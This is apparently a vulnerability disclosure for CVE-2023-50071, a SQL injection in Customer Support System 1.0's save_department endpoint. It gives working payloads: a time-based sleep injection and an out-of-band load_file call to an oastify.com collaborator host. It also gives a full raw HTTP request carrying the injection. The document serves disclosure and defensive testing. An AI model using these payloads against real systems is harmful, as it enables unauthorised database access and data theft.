# CVE-2023-50071
# Customer Support System 1.0 - Multiple SQL injection vulnerabilities - save_department

**Description**: Multiple SQL injection vulnerabilities in /customer_support/ajax.php?action=save_department in Customer Support System 1.0 allow authenticated attackers to execute arbitrary SQL commands via id or name.

**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcantara  
**Date**: 29/11/2023  
**CVE**: CVE-2023-50071  
**CVE Link**: https://www.cve.org/CVERecord?id=CVE-2023-50071  
**NVD Link**: https://nvd.nist.gov/vuln/detail/CVE-2023-50071  
**Tenable Link**: https://www.tenable.com/cve/CVE-2023-50071  
**Confirmed on**: 15/12/2023  
**Tested on**: Windows  
### Steps to reproduce:  
1- Log in to the application.  
2- Navigate to the page /customer_support/index.php?page=department_list.  
3- Create or edit a department and  insert a malicious payload into one of the following parameters: id or name.  
**Payloads**:  
id: (select load_file('\\\\c7kwr16trd54p693ve9xjbaao1usii67.oastify.com\\test'))  
name: '+(select*from(select(sleep(20)))a)+'  

```
POST /customer_support/ajax.php?action=save_department HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------279004446431847057031125356738
Content-Length: 444
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/customer_support/index.php?page=department_list
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; PHPSESSID=mfd30tu0h0s43s7kdjb74fcu0l

-----------------------------279004446431847057031125356738
Content-Disposition: form-data; name="id"


-----------------------------279004446431847057031125356738
Content-Disposition: form-data; name="name"

test'+(select*from(select(sleep(20)))a)+'
-----------------------------279004446431847057031125356738
Content-Disposition: form-data; name="description"

Teste
-----------------------------279004446431847057031125356738--
```
Discoverer(s)/Credits:  
Geraldo Alcantara  
